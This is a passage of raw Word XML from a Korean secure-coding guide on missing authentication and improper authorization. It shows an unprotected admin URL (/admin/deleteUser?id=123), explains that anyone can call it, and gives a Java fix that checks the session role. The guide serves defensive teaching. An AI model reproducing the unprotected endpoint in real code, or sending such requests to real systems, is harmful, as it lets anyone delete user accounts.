                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">, URL </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>직접</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>접근</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>시</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>인증</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>없이</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>실행됨</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">// /admin/deleteUser?id=123  → </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>누구나</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>직접</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>호출</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>가능</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002B1872">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFF2CC"/>
          </w:tcPr>
          <w:p w:rsidR="002B1872" w:rsidRDefault="00913677">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>위험</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">] </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>/admin/deleteUser?id=123 URL</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>을</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>로그인</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>없이</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>직접</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>브라우저</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>주소창에</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>입력하면</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>서버</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>측</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>인증</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>검증이</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>없으므로</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>요청이</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>그대로</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>처리됩니다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">. </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>누구든지</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>임의</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>사용자</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>계정을</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>삭제하거나</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>관리</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>기능을</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>실행할</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>수</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>있어</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>서비스</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>데이터</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>무결성이</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>완전히</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>파괴됩니다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pP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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E2EFDA"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>안전한</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>코드</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>예</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>// [</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>안전</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">] </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>서버에서</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>세션</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>권한</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>검증</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>@RequestMapping("/admin/deleteUser")</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>public void deleteUser(HttpSession session, int id) {</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    if (session.getAttribute("role") == null ||</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">        !"admin".equals(session.getAttribute("role"))) {</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">        throw new AccessDeniedException("</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>권한</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>없음</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>");</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    }</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    userService.delete(id);</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>}</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E"/>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
      <w:pPr>
        <w:pStyle w:val="21"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">  2. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>부적절한</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>인가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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFF2CC"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>준수사항</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:ind w:left="170"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">• </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>기능과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정보를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역할</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>(Role)</w:t>
            </w:r>
            <w:r>
              <w:rPr>
